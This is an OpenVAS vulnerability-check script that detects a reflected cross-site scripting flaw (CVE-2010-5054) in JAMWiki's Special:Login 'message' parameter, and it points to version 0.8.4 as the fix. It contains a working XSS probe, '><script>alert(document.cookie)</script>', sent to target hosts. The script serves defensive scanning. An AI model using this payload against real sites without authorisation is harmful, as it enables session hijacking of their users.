##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_jamwiki_message_param_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# JAMWiki 'message' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "JAMWiki versions prior to 0.8.4";
tag_insight = "The flaw is caused by improper validation of user-supplied input to the
  'message' parameter via Special:Login in error.jsp, which allows attackers
  to execute arbitrary HTML and script code in a user's browser session in
  the context of an affected site.";
tag_solution = "Upgrade to JAMWiki version 0.8.4 or later.
  For updates refer to http://jamwiki.org/wiki/en/JAMWiki";
tag_summary = "This host is running JAMWiki and is prone to cross-site scripting
  vulnerability.";

if(description)
{
  script_id(902595);
  script_version("$Revision: 13 $");
  script_bugtraq_id(39225);
  script_cve_id("CVE-2010-5054");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-13 12:12:12 +0530 (Tue, 13 Dec 2011)");
  script_name("JAMWiki 'message' Parameter Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/63564");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/39335");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/57630");
  script_xref(name : "URL" , value : "http://jamwiki.svn.sourceforge.net/viewvc/jamwiki/wiki/branches/0.8.x/jamwiki-war/src/main/webapp/CHANGELOG.txt?view=markup&amp;revision=2995");

  script_description(desc);
  script_summary("Check if JAMWiki is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("/jamwiki", "/JAMWiki", "/wiki", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item: dir + "/en/StartingPoints", port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application before trying exploit
  if('>JAMWiki<' >< res)
  {
    ## Construct the Attack Request
    url = dir + "/en/Special:Login?message=><script>alert(document.cookie)" +
                "</script>";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header: TRUE,
       pattern:"><script>alert\(document.cookie\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
